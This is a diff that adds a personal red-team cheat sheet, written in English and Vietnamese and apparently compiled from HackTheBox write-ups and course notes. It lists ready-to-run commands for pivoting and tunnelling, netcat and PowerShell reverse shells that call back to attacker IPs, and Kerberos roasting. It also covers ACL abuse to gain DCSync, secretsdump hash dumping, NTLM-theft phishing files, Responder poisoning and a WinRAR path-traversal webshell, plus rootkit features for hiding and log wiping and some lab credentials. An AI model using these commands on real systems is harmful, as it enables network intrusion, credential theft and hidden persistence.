@@ -1,0 +1,202 @@
+---------------------------------------------pivoting
+https://posts.slayerlabs.com/tunneling-quick-guide/
+https://viblo.asia/p/leo-thang-dac-quyen-ngang-tren-windows-zOQJwA5OVMP
+check ip
+last -i   #check last login
+arp -a    #check arp interacted
+route -n   #print routing table
+https://0xdf.gitlab.io/2018/09/22/htb-olympus.html#exploiting-create-container---shell-as-www-data
+cat /proc/net/fib_trie | grep -B1 "32 host LOCAL"
+/proc/net/arp
+cat /proc/net/tcp
+----------------------------idea
+1/Reverse shell từ con internal web ra cái interactive shell của con public facing
+2/Đứng từ máy kali tạo ssh local port forwarding tới thẳng máy thg dev,Trung chuyển là con web internal (socat)
+---------------------------
+https://hackmd.io/@notmtin/BJFH_5jLi      #Neo-reGeorg pivot  (for webshell automatic pivot)
+https://github.com/L-codes/Neo-reGeorg
+python3 neoreg.py generate -k hacked
+python3 neoreg.py -k hacked -u http://localhost:1337/images/upload/tunnel.php
+--------------------------------------
+attacker command: ssh <user>@<pivot_IP> -L <attacker_port>:<target_IP>:<target_port>  (ko bị firewall chặn in-bound)
+victim command:nc -e <attacker_IP> <port>   (linux)
+victim command: nc -e c:\inetpub\wwwroot\nc.exe <attacker_IP> <port> cmd.exe 
+ssh <user>@<attacker_IP> -R <attacker_port>:<target_IP>(localhost):<target_port>  (run in victime machine, only out-bound)
+https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+plink -R 8080:127.0.0.1:80 <user>@<attacker_ip>   # Tunnel attacker port 8080 -> victim localhost port 80
+ssh <user>@<target_ip> -D <attacker port>     (dùng dynamic khi cần tương tác nhiều port)
+ssh -i ./ubuntu root@xbank.cbjs -D 0.0.0.0:6666 -N
+socat TCP4-LISTEN:2222,fork TCP4:172.16.5.37:22 &
+#blind shell
+<victim>: nc -lvnp 9999 -e /bin/bash
+<attacker>: proxychains -q nc 172.16.1.12 9999
+
+https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html#shell-as-cbum
+https://www.youtube.com/watch?v=omro-ZMtpkQ
+target: ./chisel server -p 443 --socks5
+local:  ./chisel client <IP>:443 socks  (-v to print setup  )
+nano /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+proxychains <command>
+https://0xdf.gitlab.io/2022/04/04/htb-inception.html#forward-shell
+for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done
+nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused | tee scan
+
+https://hackmd.io/@CP04042K/SyBeBluis#Tunneling-port-forwarding-to-pivot
+Remote port forwarding mặc định bị disable trên SSH, để enable ta chỉnh config của file /etc/ssh/sshd_config và restart ssh service:   GatewayPorts yes
+ssh -N -R $REMOTE_ADDRESS:$REMOTE_PORT:$LOCAL_ADDRESS:$LOCAL_PORT user@target
+ssh -R 10.0.0. 1: 2222 : 127. 0. 0. 1: 1111 someuser@pivot1
+ssh -R 192.168.0.2: 3333: 127. 0. 0. 1: 2222 someotheruser@pivot2
+# Attacker machine
+chisel server -p $ATTACKER_PORT -reverse
+# Victime machine
+.\chisel.exe client $ATTACKER_IP:$ATTACKER_PORT R:$REMOTE_PORT:localhost:$LOCAL_PORT
+run autoroute -s 10.129.223.0/24(victim_network)   #meterpreter
+#ping hosts online in network
+use multi/gather/ping_sweep
+set rhosts 10.129.223.0/24
+set SESSION 1
+run
+arp-scan 192.168.0.1/24
+fping -g 199.66.11.0/24
+tracepath 192.168.0.1      #xác định thêm nhiều live hosts khác trong mạng, cũng như xác định xem đường truyền từ host hiện tại đến host đích có đi qua firewall nào không, các rule của firewall đó là gì ( chi tiết cách xác định rule firewall vô link đọc thêm)
+(SNMP Scanning, DHCP Scanning to find hosts)
+
+iptables -I INPUT -p tcp --dport $PORT -j ACCEPT
+iptables -I OUTPUT -p tcp --sport $PORT -j ACCEPT
+sudo ufw allow $PORT
+ngrok tcp/http <PORT>
+
+netsh advfirewall firewall add rule name="Something" protocol=TCP dir=in localport=3389 action=allow profile=public
+New-NetFirewallRule -DisplayName 'My port' -Profile 'Private' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 6624
+
+https://github.com/Arno0x/DNSExfiltrator  #DNS tunneling
+https://github.com/krabelize/icmpdoor/   #icmp tunnel
+--------------------------------------------------
+screen -S <name>  #create screen
+Ctrl + A + Ctrl + D #back
+screen -r <name>  #go into screen
+https://0xdf.gitlab.io/2022/04/04/htb-inception.html   #no outbound
+--------------------------------------------rootkit
+https://github.com/milabs/awesome-linux-rootkits
+https://github.com/mempodippy/vlany/wiki
+https://github.com/unix-thrust/beurk
+Hide attacker files and directories
+Realtime log cleanup (on utmp/wtmp)
+Anti process and login detection
+Bypass unhide, lsof, ps, ldd, netstat analysis
+Furtive PTY backdoor client
+--------------------------------------------List Domain Users
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html
+lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb
+
+----------kerberos
+https://ctf.krloer.com/writeups/pwc/roast_beef/
+https://blog.xpnsec.com/kerberos-attacks-part-1/
+kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
+https://helich0pper.github.io/blackfield/    #Kerberos hash by ASREP
+#checking if any account allows Kerberos pre-authentication
+GetNPUsers.py -dc-ip 10.10.10.192 BLACKFIELD.LOCAL/ -usersfile userlist.txt -no-pass
+https://www.picussecurity.com/resource/blog/kerberoasting-attack-explained-mitre-attack-t1558.003
+https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#kerberos---udp-and-tcp-88
+https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+GetUserSPNs.py
+Rubeus
+--------------------------------------------------blood hound
+https://cyberjutsujsc-my.sharepoint.com/personal/tien_cyberjutsu_io/_layouts/15/stream.aspx?id=%2Fpersonal%2Ftien%5Fcyberjutsu%5Fio%2FDocuments%2F2023%2F%F0%9F%8E%9E%20Exploit%20101%20%5BRed%20Team%5D%20Records%20%2D%20CyberJutsu%2F%5BDay%2003%5D%20Authorization%20Attack%20in%20AD%2Emp4&referrer=StreamWebApp%2EWeb&referrerScenario=AddressBarCopied%2Eview&sw=auth
+https://cyberjutsujsc-my.sharepoint.com/:f:/g/personal/tien_cyberjutsu_io/Ek1kAelGeb5ArlpDwBxGyVwBpbe_FVIPE8Dn06THm1U5Lg?e=7USCnF
+https://github.com/SpecterOps/BloodHound
+bloodhound-python -d htb.lobcal -c All -u <username> -p <passwd> -ns <server IP>
+https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#enumeration
+or run SharpHound.exe in victime machine
+https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html#:~:text=The%20default%20username%20for%20a,the%20example%20database%20is%20BloodHound.
+neo4j console
+sudo ./BloodHound --no-sandbox               #credentials neo4j:Sheng12345
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+upload <file> <des_file>
+import-module .\PowerView.ps1
+$SecPassword = ConvertTo-SecureString 'h4ck4r@' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB\sheng', $SecPassword)
+GenericAll
+net group 'Exchange Windows Permissions' sheng /add /domain
+WriteDaci   #change permision
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=HTB,DC=LOCAL' -Rights DCSync
+CanPSremote   #Winrm
+DCSync      #get data from DC
+impacket-secretsdump htb/sheng:'h4ck4r@'@10.129.95.210
+https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#enumeration
+secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
+
+https://axcheron.github.io/writeups/htb/forest/
+net localgroup "Remote Management Users" sheng /add
+crackmapexec smb 10.129.95.210 -u ax -p 'Qwerty1!' -d htb.local
+
+https://www.thehacker.recipes/ad/movement/ntlm/pth
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html#dcsync
+secretsdump.py from Impacket to dump all the hashes from the DC
+secretsdump.py -k -no-pass g0.flight.htb 
+---------------------------------DCSync và NTDS
+https://sec.vnpt.vn/2023/01/pth/
+impacket-secretsdump -ntds test/Active\ Directory/ntds.dit -system test/registry/SYSTEM local
+PtH over Kerberos
+PtH over WMI
+PtH over SMB
+----------------------------KRB_AP_ERR_SKEW
+For kerberos to work, times have to be within 5 minutes.
+https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+có sự chênh lệch thời gian giữa máy chủ Kerberos (Key Distribution Center - KDC) và máy tính client quá lớn.
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html#shell-as-cbum
+sudo ntpdate -s flight.htb
+lượm ticket của admin, từ đó lấy data qua dcsync từ ticket
+-------------------------------reverse shell
+https://0xdf.gitlab.io/2020/02/01/htb-re.html
+cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
+echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443" >> shell.ps1 
+-----------------------------yara scanner malware
+https://0xdf.gitlab.io/2020/02/01/htb-re.html
+-----------------yara rule look for shellcode by scan every process
+https://kn0wledge.fr/write-ups/forensic-injector/
+--------------------------------------------------phising
+https://0xdf.gitlab.io/2023/05/06/htb-flight.html
+https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
+https://github.com/Greenwolf/ntlm_theft
+python ntlm_theft.py -g all -s 10.10.14.4 -f sheng
+smbclient //flight.htb/shared -U S.Moon%'S@Ss!K@*t13'
+smb: \> prompt false
+smb: \> mput *
+https://0xdf.gitlab.io/2020/02/01/htb-re.html
+ods  malware
+
+https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
+scf file
+-----------------------------------------config auto recon
+# Configure plugin options here.
+[dirbuster]
+tool = 'ffuf'
+threads = 10
+wordlist = [
+    '/usr/share/seclists/Discovery/Web-Content/common.txt'
+]
+~/.config/AutoRecon/config.toml
+
+Mọi người sử dụng flag --exclude-tags='<plugin-slug-1>,<plugin-slug-2>' để skip scan á.
+Tương ứng với từng plugin service scan sẽ có <plugin-slug> khác nhau. 
+Mọi người dùng command sau để listing <plugin-slug> (nằm trong ngoặc tròn)
+autorecon -l
+ví dụ: 
+autorecon --exclude-tags='guess-tcp-ports,dirbuster' $ip
+------------------------------------------incognito
+#get useraccount from steal token
+https://cyberjutsujsc-my.sharepoint.com/:f:/g/personal/trang_cyberjutsu_io/EieuS5QjOEVBtqwh8U9aqbIB9guYXja-OQEIQQ6yUg7OZQ?e=YSeDI0
+https://viblo.asia/p/leo-thang-dac-quyen-thong-qua-windows-access-token-GrLZDo8gKk0
+-------------------------------------LLMNR Poisoning (victim gõ sai tên web)
+https://cyberjutsujsc-my.sharepoint.com/:f:/g/personal/tien_cyberjutsu_io/Ek1kAelGeb5ArlpDwBxGyVwBpbe_FVIPE8Dn06THm1U5Lg?e=7USCnF
+sudo responder -I tun0 -dwv
+------------------------------------zip path traversal
+https://0xdf.gitlab.io/2020/02/01/htb-re.html#shell-as-coby-administrator
+https://github.com/manulqwerty/Evil-WinRAR-Gen
+python3 /opt/Evil-WinRAR-Gen/evilWinRAR.py -o webshell.ace -e shell.aspx -g test.txt -p 'c:\inetpub\wwwroot\re\'
